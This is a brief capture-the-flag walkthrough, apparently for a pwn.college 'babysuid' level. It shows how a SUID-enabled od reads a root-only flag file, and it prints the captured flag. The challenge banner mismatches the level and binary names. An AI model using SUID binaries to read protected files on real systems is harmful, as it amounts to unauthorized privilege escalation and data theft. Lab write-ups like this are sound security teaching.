First, lets go the challenge directory:
# cd ../../challenge 
Run the /babysuid_level11, for obtain the
suid level, and for get some hints for the problem:
# ./babysuid_level11
    Welcome to ./babysuid_level11!

    This challenge is part of a series of programs that
    exposes you to very simple programs that let you directly read the flag.

    I just set the SUID bit on /usr/bin/od.
    Try to use it to read the flag!

    IMPORTANT: make sure to run me (./babysuid_level2) every time that you restart
    this challenge container to make sure that I set the SUID bit on /usr/bin/less!

    After this, just go backwards and use cat on flag file

# cd ..
# od flag -c
   0000000   p   w   n   .   c   o   l   l   e   g   e   {   8   v   E   i
0000020   O   G   J   o   1   D   I   S   d   x   E   4   i   V   R   r
0000040   -   h   M   2   N   8   t   .   Q   X   z   U   T   M   s   Y
0000060   j   N   3   M   z   W   }  \n
